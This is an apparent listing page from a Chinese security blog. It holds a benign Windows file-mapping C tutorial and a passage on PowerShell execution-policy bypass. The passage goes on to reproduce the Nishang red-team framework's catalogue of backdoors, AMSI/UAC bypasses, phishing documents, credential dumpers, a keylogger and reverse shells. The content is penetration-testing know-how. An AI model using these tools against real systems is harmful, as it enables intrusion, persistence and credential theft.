<!DOCTYPE html>
<html>

  <head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>倾旋的博客</title>
  <meta name="description" content="这个博客主要用来记录自己技术生涯中短小的收获和知识的备忘，还有就是一些做安全服务工作中的感受。方向可能会在不断改变：渗透测试、CTF、高效生活、应急响应、安全建设、读后感、代码审计、漏洞复现、运维杂项等等…
">

  <link rel="stylesheet" href="/css/main.css">
  <link rel="canonical" href="https://payloads.online/page14/">
  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
</head>


  <body>

    <div class="header-placeholder"></div>
<header class="header">
  <div class="wrapper">
    <div id="sidebar-toggle">TOC</div>
    <a class="site-title" href="/">倾旋的博客</a>
    <nav class="site-nav">
      
        
        <a class="page-link" href="/about/">About</a>
      
        
        <a class="page-link" href="/posts/">Posts</a>
      
        
        <a class="page-link" href="/links/">Links</a>
      
        
        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
      
        
        <a class="page-link" href="/feed.xml">RSS</a>
      
    </nav>
  </div>
</header>


    <div class="page-content">
      <div class="wrapper">
        <div class="col-main">
          <div class="home">
  <a class="rss-link" href="/feed.xml">RSS Feed</a>
  <h1 class="page-heading">Articles</h1>

  <ul class="post-list">
    
      <li>
        <h2>
          <a class="post-link" href="/archivers/2018-12-20/windows-FileMapping">Windows 文件映射</a>
        </h2>
        
        <div class="post-meta">Dec 20, 2018</div>

        <div class="post-excerpt">
          虚拟地址空间，用于存放文件内容，当文件被映射完成后，改写视图虚拟地址空间的内容就相当于更改文件内容。

<p>一般情况下，当代码运行完毕后，视图将会被自动写入文件中。</p>

<h2 id="0x01-文件映射的步骤">0x01 文件映射的步骤</h2>

<ul>
  <li>CreateFile()…</li>
  <li>CreateFileMapping()…</li>
  <li>MapViewofFile()…</li>
  <li>FlushViewofFile()…</li>
</ul>

<p>首先需要创建一个文件句柄，然后再创建一个文件映射的Mapping内核对象，通过映射获得视图。</p>

<h2 id="0x02-文件映射简单代码">0x02 文件映射简单代码</h2>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// ConsoleApplication2.cpp : 定义控制台应用程序的入口点。</span>
<span class="c1">//</span>
<span class="cp">#include "stdafx.h"
#include &lt;iostream&gt;
#include &lt;Windows.h&gt;
</span>
<span class="kt">int</span> <span class="nf">_tmain</span><span class="p">()</span>
<span class="p">{</span>
	<span class="c1">// 内存映射</span>
	<span class="c1">// CreateFile()...</span>
	<span class="c1">// CreateFileMapping()...</span>
	<span class="c1">// MapViewofFile()...</span>
	<span class="c1">// FlushViewofFile...</span>
	<span class="n">HANDLE</span> <span class="n">hFile</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"C:</span><span class="se">\\</span><span class="s">Temp</span><span class="se">\\</span><span class="s">99.txt"</span><span class="p">),</span> <span class="n">GENERIC_ALL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_ALWAYS</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">hFile</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="n">GetLastError</span><span class="p">();</span>
		<span class="n">MessageBox</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"CreateFile"</span><span class="p">),</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"Error"</span><span class="p">),</span> <span class="n">MB_OK</span><span class="p">);</span>
		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">HANDLE</span> <span class="n">hMap</span> <span class="o">=</span> <span class="n">CreateFileMapping</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1024</span><span class="p">,</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"f"</span><span class="p">));</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">hMap</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">TCHAR</span> <span class="n">szBuff</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"sssss</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">TCHAR</span> <span class="o">*</span> <span class="n">pFileVoid</span> <span class="o">=</span> <span class="p">(</span><span class="n">TCHAR</span> <span class="o">*</span><span class="p">)</span><span class="n">MapViewOfFile</span><span class="p">(</span><span class="n">hMap</span><span class="p">,</span> <span class="n">FILE_MAP_ALL_ACCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
	<span class="n">_tcscpy_s</span><span class="p">(</span><span class="n">pFileVoid</span><span class="p">,</span> <span class="n">_countof</span><span class="p">(</span><span class="n">szBuff</span><span class="p">),</span> <span class="n">szBuff</span><span class="p">);</span>
	<span class="n">std</span><span class="o">::</span><span class="n">wprintf</span><span class="p">(</span><span class="n">pFileVoid</span><span class="p">);</span>
	<span class="n">system</span><span class="p">(</span><span class="s">"pause"</span><span class="p">);</span>
	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hMap</span><span class="p">);</span>
	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hFile</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="0x03-api-list">0x03 API List</h2>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HANDLE</span> <span class="n">WINAPI</span> <span class="nf">CreateFile</span><span class="p">(</span>
  <span class="n">_In_</span>     <span class="n">LPCTSTR</span>               <span class="n">lpFileName</span><span class="p">,</span>
  <span class="n">_In_</span>     <span class="n">DWORD</span>                 <span class="n">dwDesiredAccess</span><span class="p">,</span>
  <span class="n">_In_</span>     <span class="n">DWORD</span>                 <span class="n">dwShareMode</span><span class="p">,</span>
  <span class="n">_In_opt_</span> <span class="n">LPSECURITY_ATTRIBUTES</span> <span class="n">lpSecurityAttributes</span><span class="p">,</span>
  <span class="n">_In_</span>     <span class="n">DWORD</span>                 <span class="n">dwCreationDisposition</span><span class="p">,</span>
  <span class="n">_In_</span>     <span class="n">DWORD</span>                 <span class="n">dwFlagsAndAttributes</span><span class="p">,</span>
  <span class="n">_In_opt_</span> <span class="n">HANDLE</span>                <span class="n">hTemplateFile</span>
<span class="p">);</span>
</code></pre></div></div>
<hr>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HANDLE</span> <span class="n">WINAPI</span> <span class="nf">CreateFileMapping</span><span class="p">(</span>
  <span class="n">_In_</span>     <span class="n">HANDLE</span>                <span class="n">hFile</span><span class="p">,</span>
  <span class="n">_In_opt_</span> <span class="n">LPSECURITY_ATTRIBUTES</span> <span class="n">lpAttributes</span><span class="p">,</span>
  <span class="n">_In_</span>     <span class="n">DWORD</span>                 <span class="n">flProtect</span><span class="p">,</span>
  <span class="n">_In_</span>     <span class="n">DWORD</span>                 <span class="n">dwMaximumSizeHigh</span><span class="p">,</span>
  <span class="n">_In_</span>     <span class="n">DWORD</span>                 <span class="n">dwMaximumSizeLow</span><span class="p">,</span>
  <span class="n">_In_opt_</span> <span class="n">LPCTSTR</span>               <span class="n">lpName</span>
<span class="p">);</span>
</code></pre></div></div>
<hr>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">LPVOID</span> <span class="n">WINAPI</span> <span class="nf">MapViewOfFile</span><span class="p">(</span>
  <span class="n">_In_</span> <span class="n">HANDLE</span> <span class="n">hFileMappingObject</span><span class="p">,</span>
  <span class="n">_In_</span> <span class="n">DWORD</span>  <span class="n">dwDesiredAccess</span><span class="p">,</span>
  <span class="n">_In_</span> <span class="n">DWORD</span>  <span class="n">dwFileOffsetHigh</span><span class="p">,</span>
  <span class="n">_In_</span> <span class="n">DWORD</span>  <span class="n">dwFileOffsetLow</span><span class="p">,</span>
  <span class="n">_In_</span> <span class="n">SIZE_T</span> <span class="n">dwNumberOfBytesToMap</span>
<span class="p">);</span>
</code></pre></div></div>
<hr>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">FlushViewOfFile</span><span class="p">(</span>
  <span class="n">_In_</span> <span class="n">LPCVOID</span> <span class="n">lpBaseAddress</span><span class="p">,</span>
  <span class="n">_In_</span> <span class="n">SIZE_T</span>  <span class="n">dwNumberOfBytesToFlush</span>
<span class="p">);</span>
</code></pre></div></div>
<hr>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">UnmapViewOfFile</span><span class="p">(</span>
  <span class="n">_In_</span> <span class="n">LPCVOID</span> <span class="n">lpBaseAddress</span>
<span class="p">);</span>
</code></pre></div></div>
<hr>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">UnmapViewOfFile</span><span class="p">(</span>
  <span class="n">_In_</span> <span class="n">LPCVOID</span> <span class="n">lpBaseAddress</span>
<span class="p">);</span>
</code></pre></div></div>

<h2 id="0x04-创建一个超大文件">0x04 创建一个超大文件</h2>

<p>在写Example的过程中，我发现申请映射的内存空间会把每个字节写入文件中。</p>

<p>把<code class="language-plaintext highlighter-rouge">MapViewOfFile</code>的<code class="language-plaintext highlighter-rouge">dwMaximumSizeHigh</code>和<code class="language-plaintext highlighter-rouge">dwMaximumSizeLow</code>设置为一个超大值时，就能够把那么大的内存写入文件。</p>

<p>当然前提是映射的空间不得大于<code class="language-plaintext highlighter-rouge">CreateFileMapping</code>的<code class="language-plaintext highlighter-rouge">dwMaximumSizeHigh</code>和<code class="language-plaintext highlighter-rouge">dwMaximumSizeLow</code>。</p>

<p>例如：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="c1">// ConsoleApplication2.cpp : 定义控制台应用程序的入口点。</span>
<span class="c1">//</span>
<span class="cp">#include "stdafx.h"
#include &lt;iostream&gt;
#include &lt;Windows.h&gt;
</span>
<span class="kt">int</span> <span class="nf">_tmain</span><span class="p">()</span>
<span class="p">{</span>   <span class="n">DWORD</span> <span class="n">dwFileSize</span> <span class="o">=</span> <span class="mi">1024</span><span class="o">*</span><span class="mi">1024</span><span class="o">*</span><span class="mi">1024</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">hFile</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"C:</span><span class="se">\\</span><span class="s">Temp</span><span class="se">\\</span><span class="s">99.txt"</span><span class="p">),</span> <span class="n">GENERIC_ALL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_ALWAYS</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">HANDLE</span> <span class="n">hMap</span> <span class="o">=</span> <span class="n">CreateFileMapping</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">dwFileSize</span><span class="p">,</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"f"</span><span class="p">));</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">hMap</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">TCHAR</span> <span class="o">*</span> <span class="n">pFileVoid</span> <span class="o">=</span> <span class="p">(</span><span class="n">TCHAR</span> <span class="o">*</span><span class="p">)</span><span class="n">MapViewOfFile</span><span class="p">(</span><span class="n">hMap</span><span class="p">,</span> <span class="n">FILE_MAP_ALL_ACCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">dwFileSize</span><span class="p">);</span>
	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hMap</span><span class="p">);</span>
	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hFile</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>这样就能够创建一个1024*1024*1024个字节的文件了。</p>
--&gt;
          <!---->
          通过使用文件映射来增强修改文件的效率
          <p>
            <a class="post-link" href="/archivers/2018-12-20/windows-FileMapping">Read More »</a>
          </p>
        </div>
      </li>
    
      <li>
        <h2>
          <a class="post-link" href="/archivers/2018-12-19/1">Intranet Space - nishang <readteam></readteam></a>
        </h2>
        
        <div class="post-meta">Dec 19, 2018</div>

        <div class="post-excerpt">
          <!--<h2 id="0x00-powershell-executionpolicy执行策略">0x00 Powershell ExecutionPolicy（执行策略）</h2>

<h3 id="设置执行策略set-executionpolicy">设置执行策略(Set-ExecutionPolicy)</h3>

<p>Powershell默认的权限策略是：“Restricted”</p>

<p>查看当前执行策略：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:&gt; Get-ExecutionPolicy
Restricted
</code></pre></div></div>

<p>查看所有执行策略：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS E:&gt;  [System.Enum]::GetNames([Microsoft.PowerShell.ExecutionPolicy])
Unrestricted # 权限最高，可以不受限制执行任何脚本。
RemoteSigned # 本地脚本无限制，但是对来自网络的脚本必须经过签名
AllSigned    # 所有脚本都必须经过签名才能在运行
Restricted   # Powershell默认的策略，不允许任何脚本执行
Default      # 为Powershell默认的策略
Bypass       # 无任何限制策略，不警告、不提示
Undefined    # 当前范围中没有设置执行策略
</code></pre></div></div>

<p>设置执行策略：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-ExecutionPolicy -ExecutionPolicy &lt;PolicyName&gt;
</code></pre></div></div>

<p>设置执行策略，并设置影响对象：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-ExecutionPolicy -ExecutionPolicy &lt;PolicyName&gt; -Scope &lt;scope&gt;
</code></pre></div></div>

<h3 id="执行策略影响范围scope">执行策略影响范围（Scope）</h3>

<p>影响范围：Scope ，设置策略时选择影响对象。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:&gt;Get-ExecutionPolicy -List
        Scope ExecutionPolicy
        ----- ---------------
MachinePolicy       Undefined
   UserPolicy       Undefined
      Process       Undefined
  CurrentUser    RemoteSigned
 LocalMachine       AllSigned
</code></pre></div></div>
<ul>
  <li>CurrentUser：执行策略仅影响当前用户。它存储在HKEY_CURRENT_USER注册表子项中。</li>
  <li>Process ： 执行策略仅影响当前会话（当前的PowerShell进程）。</li>
  <li>LOCALMACHINE ：执行策略会影响当前计算机上的所有用户。它存储在HKEY_LOCAL_MACHINE注册表子项中。</li>
</ul>

<p><strong>修改执行策略需要管理员权限</strong></p>

<h3 id="删除执行策略">删除执行策略</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-ExecutionPolicy Undefined
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-ExecutionPolicy Undefined -Scope LocalMachine
</code></pre></div></div>

<h3 id="设置会话执行策略">设置会话执行策略</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell -ExecutionPolicy Bypass ...
</code></pre></div></div>

<h2 id="0x01-nishang">0x01 Nishang</h2>

<p>Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing.</p>

<h2 id="0x02-usage">0x02 Usage</h2>

<p>Import all the scripts in the current PowerShell session (PowerShell v3 onwards).</p>

<p>如何使用：导入所有的脚本到当前的Powershell会话中，但是Powershell的版本必须是version 3。</p>

<p><strong>导入命令：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\nishang&gt; Import-Module .\nishang.psm1
</code></pre></div></div>

<p>单独导入：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\nishang&gt; . C:\nishang\Gather\Get-Information.ps1
PS C:\nishang&gt; Get-Information
</code></pre></div></div>
<p>获取函数的帮助信息可以这样输入：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>To get help about any script or function, use:

PS C:\nishang&gt; Get-Help [scriptname] -full
</code></pre></div></div>

<h2 id="0x03-模块分类">0x03 模块分类</h2>

<h4 id="scripts">Scripts</h4>
<p>Nishang currently contains the following scripts and payloads.</p>

<h4 id="activedirectory">ActiveDirectory</h4>
<p><a href="https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1">Set-DCShadowPermissions</a></p>

<p>Modify AD objects to provide minimal permissions required for DCShadow.</p>

<h4 id="antak---the-webshell">Antak - the Webshell</h4>
<p><a href="https://github.com/samratashok/nishang/tree/master/Antak-WebShell">Antak</a></p>

<p>Execute PowerShell scripts in memory, run commands, and download and upload files using this webshell.</p>

<h4 id="backdoors">Backdoors</h4>
<p><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/HTTP-Backdoor.ps1">HTTP-Backdoor</a></p>

<p>A backdoor which can receive instructions from third party websites and execute PowerShell scripts in memory.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/DNS_TXT_Pwnage.ps1">DNS_TXT_Pwnage</a></p>

<p>A backdoor which can receive commands and PowerShell scripts from DNS TXT queries, execute them on a target, and be remotely controlled using the queries.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Execute-OnTime.ps1">Execute-OnTime</a></p>

<p>A backdoor which can execute PowerShell scripts at a given time on a target.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Gupt-Backdoor.ps1">Gupt-Backdoor</a></p>

<p>A backdoor which can receive commands and scripts from a WLAN SSID without connecting to it.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Add-ScrnSaveBackdoor.ps1">Add-ScrnSaveBackdoor</a></p>

<p>A backdoor which can use Windows screen saver for remote command and script execution.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Invoke-ADSBackdoor.ps1">Invoke-ADSBackdoor</a></p>

<p>A backdoor which can use alternate data streams and Windows Registry to achieve persistence.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Add-RegBackdoor.ps1">Add-RegBackdoor</a></p>

<p>A backdoor which uses well known Debugger trick to execute payload with Sticky keys and Utilman (Windows key + U).</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1">Set-RemoteWMI</a></p>

<p>Modify permissions of DCOM and WMI namespaces to allow access to a non-admin user.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemotePSRemoting.ps1">Set-RemotePSRemoting</a></p>

<p>Modify permissions of PowerShell remoting to allow access to a non-admin user.</p>

<h4 id="bypass">Bypass</h4>
<p><a href="https://github.com/samratashok/nishang/blob/master/Bypass/Invoke-AmsiBypass.ps1">Invoke-AmsiBypass</a></p>

<p>Implementation of publicly known methods to bypass/avoid AMSI.</p>

<h4 id="client">Client</h4>
<p><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1">Out-CHM</a></p>

<p>Create infected CHM files which can execute PowerShell commands and scripts.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-Word.ps1">Out-Word</a></p>

<p>Create Word files and infect existing ones to run PowerShell commands and scripts.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-Excel.ps1">Out-Excel</a></p>

<p>Create Excel files and infect existing ones to run PowerShell commands and scripts.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-HTA.ps1">Out-HTA</a></p>

<p>Create a HTA file which can be deployed on a web server and used in phishing campaigns.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-Java.ps1">Out-Java</a></p>

<p>Create signed JAR files which can be used with applets for script and command execution.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-Shortcut.ps1">Out-Shortcut</a></p>

<p>Create shortcut files capable of executing PowerShell commands and scripts.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-WebQuery.ps1">Out-WebQuery</a></p>

<p>Create IQY files for phishing credentials and SMB hashes.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-JS.ps1">Out-JS</a></p>

<p>Create JS files capable of executing PowerShell commands and scripts.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-SCT.ps1">Out-SCT</a></p>

<p>Create SCT files capable of executing PowerShell commands and scripts.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-SCF.ps1">Out-SCF</a></p>

<p>Create a SCF file which can be used for capturing NTLM hash challenges.</p>

<h4 id="escalation">Escalation</h4>
<p><a href="https://github.com/samratashok/nishang/blob/master/Escalation/Enable-DuplicateToken.ps1">Enable-DuplicateToken</a></p>

<p>When SYSTEM privileges are required.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Escalation/Remove-Update.ps1">Remove-Update</a></p>

<p>Introduce vulnerabilities by removing patches.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Escalation/Invoke-PsUACme.ps1">Invoke-PsUACme</a></p>

<p>Bypass UAC.</p>

<h4 id="execution">Execution</h4>
<p><a href="https://github.com/samratashok/nishang/blob/master/Execution/Download-Execute-PS.ps1">Download-Execute-PS</a></p>

<p>Download and execute a PowerShell script in memory.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Execution/Download_Execute.ps1">Download_Execute</a></p>

<p>Download an executable in text format, convert it to an executable, and execute.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Execution/Execute-Command-MSSQL.ps1">Execute-Command-MSSQL</a></p>

<p>Run PowerShell commands, native commands, or SQL commands on a MSSQL Server with sufficient privileges.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Execution/Execute-DNSTXT-Code.ps1">Execute-DNSTXT-Code</a></p>

<p>Execute shellcode in memory using DNS TXT queries.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Execution/Out-RundllCommand.ps1">Out-RundllCommand</a></p>

<p>Execute PowerShell commands and scripts or a reverse PowerShell session using rundll32.exe.</p>

<h4 id="gather">Gather</h4>
<p><a href="https://github.com/samratashok/nishang/blob/master/Gather/Check-VM.ps1">Check-VM</a></p>

<p>Check for a virtual machine.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1">Copy-VSS</a></p>

<p>Copy the SAM file using Volume Shadow Copy Service.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Gather/Credentials.ps1">Invoke-CredentialsPhish</a></p>

<p>Trick a user into giving credentials in plain text.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Gather/FireBuster.ps1">FireBuster</a>
<a href="https://github.com/samratashok/nishang/blob/master/Gather/FireListener.ps1">FireListener</a></p>

<p>A pair of scripts for egress testing</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Gather/Get-Information.ps1">Get-Information</a></p>

<p>Get juicy information from a target.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Gather/Get-LSASecret.ps1">Get-LSASecret</a></p>

<p>Get LSA Secret from a target.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHashes.ps1">Get-PassHashes</a></p>

<p>Get password hashes from a target.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Gather/Get-WLAN-Keys.ps1">Get-WLAN-Keys</a></p>

<p>Get WLAN keys in plain text from a target.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Gather/Keylogger.ps1">Keylogger</a></p>

<p>Log keystrokes from a target.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Gather/Invoke-MimikatzWDigestDowngrade.ps1">Invoke-MimikatzWdigestDowngrade</a></p>

<p>Dump user passwords in plain on Windows 8.1 and Server 2012</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHints.ps1">Get-PassHints</a></p>

<p>Get password hints of Windows users from a target.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Gather/Show-TargetScreen.ps1">Show-TargetScreen</a></p>

<p>Connect back and Stream target screen using MJPEG.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1">Invoke-Mimikatz</a></p>

<p>Load mimikatz in memory. Updated and with some customisation.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikittenz.ps1">Invoke-Mimikittenz</a></p>

<p>Extract juicy information from target process (like browsers) memory using regex.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Gather/Invoke-SSIDExfil.ps1">Invoke-SSIDExfil</a></p>

<p>Exfiltrate information like user credentials, using WLAN SSID.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Gather/Invoke-SessionGopher.ps1">Invoke-SessionGopher</a></p>

<p>Identify admin jump-boxes and/or computers used to access Unix machines.</p>

<h4 id="mitm">MITM</h4>
<p><a href="https://github.com/samratashok/nishang/blob/master/MITM/Invoke-Interceptor.ps1">Invoke-Interceptor</a></p>

<p>A local HTTPS proxy for MITM attacks.</p>

<h4 id="pivot">Pivot</h4>
<p><a href="https://github.com/samratashok/nishang/blob/master/Pivot/Create-MultipleSessions.ps1">Create-MultipleSessions</a></p>

<p>Check credentials on multiple computers and create PSSessions.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Pivot/Run-EXEonRemote.ps1">Run-EXEonRemote</a>
Copy and execute an executable on multiple machines.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Pivot/Invoke-NetworkRelay.ps1">Invoke-NetworkRelay</a>
Create network relays between computers.</p>

<h4 id="prasadhak">Prasadhak</h4>
<p><a href="https://github.com/samratashok/nishang/blob/master/Prasadhak/Prasadhak.ps1">Prasadhak</a></p>

<p>Check running hashes of running process against the VirusTotal database.</p>

<h4 id="scan">Scan</h4>
<p><a href="https://github.com/samratashok/nishang/blob/master/Scan/Brute-Force.ps1">Brute-Force</a></p>

<p>Brute force FTP, Active Directory, MSSQL, and Sharepoint.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Scan/Port-Scan.ps1">Port-Scan</a></p>

<p>A handy port scanner.</p>

<h4 id="powerpreter">Powerpreter</h4>
<p><a href="https://github.com/samratashok/nishang/tree/master/powerpreter">Powerpreter</a></p>

<p>All the functionality of nishang in a single script module.</p>

<h4 id="shells">Shells</h4>
<p><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PsGcat.ps1">Invoke-PsGcat</a></p>

<p>Send commands and scripts to specifed Gmail account to be executed by Invoke-PsGcatAgent</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PsGcatAgent.ps1">Invoke-PsGcatAgent</a></p>

<p>Execute commands and scripts sent by Invoke-PsGcat.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">Invoke-PowerShellTcp</a></p>

<p>An interactive PowerShell reverse connect or bind shell</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1">Invoke-PowerShellTcpOneLine</a></p>

<p>Stripped down version of Invoke-PowerShellTcp. Also contains, a skeleton version which could fit in two tweets.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLineBind.ps1">Invoke-PowerShellTcpOneLineBind</a></p>

<p>Bind version of Invoke-PowerShellTcpOneLine.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellUdp.ps1">Invoke-PowerShellUdp</a></p>

<p>An interactive PowerShell reverse connect or bind shell over UDP</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellUdpOneLine.ps1">Invoke-PowerShellUdpOneLine</a></p>

<p>Stripped down version of Invoke-PowerShellUdp.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PoshRatHttps.ps1">Invoke-PoshRatHttps</a></p>

<p>Reverse interactive PowerShell over HTTPS.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PoshRatHttp.ps1">Invoke-PoshRatHttp</a></p>

<p>Reverse interactive PowerShell over HTTP.</p>

